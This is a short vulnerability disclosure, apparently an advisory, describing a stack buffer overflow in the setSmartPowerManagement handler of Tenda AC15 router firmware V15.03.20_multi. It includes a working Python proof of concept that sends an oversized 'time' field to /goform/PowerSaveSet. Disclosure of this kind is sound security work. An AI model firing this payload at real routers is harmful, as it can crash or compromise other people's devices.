## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `setSmartPowerManagement` function. The `v13` variable receives the `time` parameter from a POST request and `v13` is directly parsed into the `v10`, `v9`, `v8` and `v7`. However, since the user can control the input of `v13`, the statement `sprintf(s, "%s:%s", (const char *)v10, (const char *)v9); sprintf(v5, "%s:%s", (const char *)v8, (const char *)v7);` can cause a buffer overflow by  `v10`, `v9`, `v8` and `v7`. 

![image-20240305230652504](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305230652504.png)

![image-20240314175638006](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314175638006.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/PowerSaveSet"
payload = 'a'*1000 + ':aaaa-bbb:1'

data = {"time": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314175707090](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314175707090.png)
